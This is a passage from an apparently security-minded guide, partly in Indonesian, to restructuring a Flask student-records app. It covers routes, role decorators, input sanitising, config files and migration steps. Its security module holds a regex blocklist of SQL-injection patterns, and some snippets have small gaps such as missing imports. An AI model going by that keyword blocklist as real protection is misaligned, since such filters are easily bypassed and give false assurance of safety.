from app.security import sanitize_input

students_bp = Blueprint('students', __name__)

@students_bp.route('/')
@login_required
def index():
    """List students"""
    # Filter by user ownership
    if current_user.is_admin():
        students = Student.query.all()
    else:
        students = Student.query.filter_by(owner_id=current_user.id).all()

    return render_template('index.html', students=students)

@students_bp.route('/add', methods=['GET', 'POST'])
@login_required
def add():
    """Add student"""
    form = StudentForm()

    if form.validate_on_submit():
        # Sanitize input
        name = sanitize_input(form.name.data, max_length=100)

        # Create student using ORM (prevents SQL injection)
        student = Student(
            name=name,
            age=form.age.data,
            grade=form.grade.data,
            owner_id=current_user.id
        )

        db.session.add(student)

        # Log action
        log = AuditLog(
            user_id=current_user.id,
            action='CREATE',
            resource_type='Student',
            resource_id=student.id,
            details=f'Created student: {student.name}',
            ip_address=request.remote_addr
        )
        db.session.add(log)

        db.session.commit()

        flash('Student added successfully!', 'success')
        return redirect(url_for('students.index'))

    return render_template('add.html', form=form)

@students_bp.route('/edit/<string:id>', methods=['GET', 'POST'])
@login_required
def edit(id):
    """Edit student"""
    # Get student with authorization check
    student = Student.query.get_or_404(id)

    # Check authorization
    if not student.can_modify(current_user):
        abort(403)

    form = StudentForm()

    if form.validate_on_submit():
        # Update student (ORM prevents SQL injection)
        old_data = f"{student.name}, {student.age}, {student.grade}"

        student.name = sanitize_input(form.name.data, max_length=100)
        student.age = form.age.data
        student.grade = form.grade.data

        # Log action
        log = AuditLog(
            user_id=current_user.id,
            action='UPDATE',
            resource_type='Student',
            resource_id=student.id,
            details=f'Updated from [{old_data}] to [{student.name}, {student.age}, {student.grade}]',
            ip_address=request.remote_addr
        )
        db.session.add(log)

        db.session.commit()

        flash('Student updated successfully!', 'success')
        return redirect(url_for('students.index'))

    # Pre-fill form
    elif request.method == 'GET':
        form.name.data = student.name
        form.age.data = student.age
        form.grade.data = student.grade

    return render_template('edit.html', form=form, student=student)

@students_bp.route('/delete/<string:id>', methods=['POST'])
@login_required
def delete(id):
    """Delete student"""
    student = Student.query.get_or_404(id)

    # Check authorization
    if not student.can_delete(current_user):
        abort(403)

    student_name = student.name

    # Log action before deletion
    log = AuditLog(
        user_id=current_user.id,
        action='DELETE',
        resource_type='Student',
        resource_id=id,
        details=f'Deleted student: {student_name}',
        ip_address=request.remote_addr
    )
    db.session.add(log)

    db.session.delete(student)
    db.session.commit()

    flash(f'Student {student_name} deleted successfully!', 'success')
    return redirect(url_for('students.index'))
```

---

#### 7. `app/decorators.py` - Custom Decorators

```python
from functools import wraps
from flask import abort
from flask_login import current_user

def admin_required(f):
    """Decorator to require admin role"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not current_user.is_authenticated:
            abort(401)
        if not current_user.is_admin():
            abort(403)
        return f(*args, **kwargs)
    return decorated_function

def teacher_or_admin_required(f):
    """Decorator to require teacher or admin role"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not current_user.is_authenticated:
            abort(401)
        if current_user.role not in ['teacher', 'admin']:
            abort(403)
        return f(*args, **kwargs)
    return decorated_function
```

---

#### 8. `app/security.py` - Security Utilities

```python
import html
import re

def sanitize_input(text, max_length=100):
    """
    Sanitize user input

    Args:
        text: Input text to sanitize
        max_length: Maximum allowed length

    Returns:
        Sanitized text
    """
    if not text:
        return ''

    # Convert to string
    text = str(text)

    # Remove leading/trailing whitespace
    text = text.strip()

    # Normalize whitespace
    text = ' '.join(text.split())

    # Truncate to max length
    text = text[:max_length]

    # HTML escape (prevents XSS)
    text = html.escape(text)

    return text

def check_sql_injection(input_string):
    """
    Basic SQL injection pattern detection

    Args:
        input_string: String to check

    Returns:
        True if suspicious pattern detected, False otherwise
    """
    if not input_string:
        return False

    sql_patterns = [
        r"(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION)\b)",
        r"(--|#|\/\*|\*\/)",
        r"(\bOR\b.*=.*)",
        r"(\bAND\b.*=.*)",
        r"(;.*)",
        r"(\'.*--)",
        r"(\".*--)",
    ]

    for pattern in sql_patterns:
        if re.search(pattern, str(input_string), re.IGNORECASE):
            return True

    return False
```

---

#### 9. `run.py` - Application Entry Point

```python
import os
from app import create_app

# Get configuration from environment
config_name = os.environ.get('FLASK_ENV', 'development')

# Create application
app = create_app(config_name)

if __name__ == '__main__':
    # Development server (NOT for production)
    app.run(
        host='127.0.0.1',  # Localhost only
        port=5000,
        debug=(config_name == 'development')
    )
```

---

#### 10. `wsgi.py` - Production Entry Point

```python
import os
from app import create_app

# Use production configuration
app = create_app('production')

if __name__ == "__main__":
    # This should never be used directly
    # Use Gunicorn or uWSGI instead
    raise RuntimeError("Use a production WSGI server (gunicorn, uwsgi)")
```

---

#### 11. `requirements.txt` - Dependencies

```txt
Flask==3.0.0
Flask-SQLAlchemy==3.1.1
Flask-Login==0.6.3
Flask-WTF==1.2.1
WTForms==3.1.1
Flask-Limiter==3.5.0
python-dotenv==1.0.0
email-validator==2.1.0

# Production server
gunicorn==21.2.0

# Testing
pytest==7.4.3
pytest-cov==4.1.0

# Code quality
flake8==6.1.0
black==23.12.0
```

---

#### 12. `.env.example` - Environment Variables Template

```bash
# Flask Configuration
FLASK_ENV=development
FLASK_DEBUG=1

# Secret Key (generate with: python -c "import secrets; print(secrets.token_hex(32))")
SECRET_KEY=your-secret-key-here

# Database
DATABASE_URL=sqlite:///instance/students.db

# Email (optional, for password reset)
MAIL_SERVER=smtp.gmail.com
MAIL_PORT=587
MAIL_USE_TLS=1
MAIL_USERNAME=your-email@example.com
MAIL_PASSWORD=your-email-password
```

---

#### 13. `.gitignore`

```gitignore
# Python
__pycache__/
*.py[cod]
*$py.class
*.so
.Python
env/
venv/
.venv/
ENV/

# Flask
instance/
.webassets-cache

# Environment variables
.env

# Database
*.db
*.sqlite3

# Logs
logs/
*.log

# IDE
.vscode/
.idea/
*.swp
*.swo

# Testing
.pytest_cache/
.coverage
htmlcov/

# OS
.DS_Store
Thumbs.db
```

---

### Migration dari Kode Lama ke Struktur Baru

#### Langkah-langkah Migration:

**Step 1: Backup kode lama**
```bash
cp app.py app.py.backup
cp -r templates/ templates.backup/
```

**Step 2: Buat struktur folder baru**
```bash
mkdir -p app/templates/errors
mkdir -p app/static/css app/static/js
mkdir -p tests logs
```

**Step 3: Install dependencies**
```bash
pip install -r requirements.txt
```

**Step 4: Setup environment variables**
```bash
cp .env.example .env
# Edit .env dengan secret key yang baru
python -c "import secrets; print(secrets.token_hex(32))"
# Copy output ke SECRET_KEY di .env
```

**Step 5: Migrate database (optional - untuk existing data)**
```bash
# Export data dari database lama
sqlite3 instance/students.db "SELECT * FROM student;" > students_backup.sql

# Setelah setup baru, import kembali dengan adjustment
```

**Step 6: Test aplikasi baru**
```bash
python run.py
# Buka browser: http://127.0.0.1:5000
```

---

### Cara Menjalankan Aplikasi

#### Development:
```bash
# Set environment
export FLASK_ENV=development

# Run development server
python run.py
```

#### Production:
```bash
# Set environment
export FLASK_ENV=production
export SECRET_KEY="your-production-secret-key"

# Run with Gunicorn
gunicorn -w 4 -b 127.0.0.1:5000 wsgi:app

# Or with uWSGI
uwsgi --http 127.0.0.1:5000 --wsgi-file wsgi.py --callable app --processes 4
```

#### Testing:
```bash
# Run all tests
pytest

# Run with coverage
pytest --cov=app tests/

# Run specific test file
pytest tests/test_auth.py
```

---

### Diagram Koneksi Antar File

```
run.py
  │
  ├─> app/__init__.py (create_app)
  │      │
  │      ├─> config.py (load config)
  │      │
  │      ├─> app/models.py (User, Student, AuditLog)
  │      │     └─> db (SQLAlchemy)
  │      │
  │      ├─> app/forms.py (LoginForm, StudentForm)
  │      │     └─> app/models.py (for validation)
  │      │
  │      ├─> app/auth.py (Blueprint)
  │      │     ├─> app/forms.py
  │      │     ├─> app/models.py
  │      │     └─> templates/login.html, register.html
  │      │
  │      ├─> app/students.py (Blueprint)
  │      │     ├─> app/forms.py
  │      │     ├─> app/models.py
  │      │     ├─> app/decorators.py
  │      │     ├─> app/security.py
  │      │     └─> templates/index.html, add.html, edit.html
  │      │
  │      └─> app/decorators.py (admin_required)
  │            └─> flask_login.current_user
  │
  └─> Flask app instance
```

---

### Penjelasan Import/Connection

#### Dalam `app/__init__.py`:
```python
from flask import Flask
from flask_sqlalchemy import SQLAlchemy
from config import config

# Extensions diinisialisasi
db = SQLAlchemy()
login_manager = LoginManager()

def create_app(config_name):
    app = Flask(__name__)
    app.config.from_object(config[config_name])

    # Connect extensions to app
    db.init_app(app)
    login_manager.init_app(app)

    # Import dan register blueprints
    from app.auth import auth_bp
    from app.students import students_bp

    app.register_blueprint(auth_bp)
    app.register_blueprint(students_bp)

    return app
```

#### Dalam `app/models.py`:
```python
# Import db dari __init__.py
from app import db

# Define models
class User(db.Model):
    # ...
```

#### Dalam `app/auth.py`:
```python
from flask import Blueprint
from app import db  # Import db instance
from app.models import User, AuditLog  # Import models
from app.forms import LoginForm  # Import forms

# Create blueprint
auth_bp = Blueprint('auth', __name__, url_prefix='/auth')

@auth_bp.route('/login')
def login():
    # Use imported models, forms, db
    pass
```

#### Dalam `app/students.py`:
```python
from flask import Blueprint
from app import db
from app.models import Student
from app.forms import StudentForm
from app.decorators import admin_required
from app.security import sanitize_input

students_bp = Blueprint('students', __name__)

@students_bp.route('/')
@login_required  # Dari flask_login
@admin_required  # Dari app.decorators
def index():
    # Use all imported components
    pass
```

---

### Keuntungan Struktur Baru

1. **Separation of Concerns**: Setiap file punya tanggung jawab spesifik
2. **Maintainability**: Lebih mudah maintain dan debug
3. **Testability**: Lebih mudah untuk write unit tests
4. **Scalability**: Mudah menambah fitur baru
5. **Security**: Security code terisolasi dan reusable
6. **Team Collaboration**: Multiple developers bisa work on different files
7. **Blueprint Pattern**: Routes terorganisir dalam blueprints
8. **Configuration Management**: Config terpisah berdasarkan environment

---

**Catatan:** Semua kerentanan ini ditemukan dalam kode dan harus segera diperbaiki sebelum aplikasi di-deploy ke production.
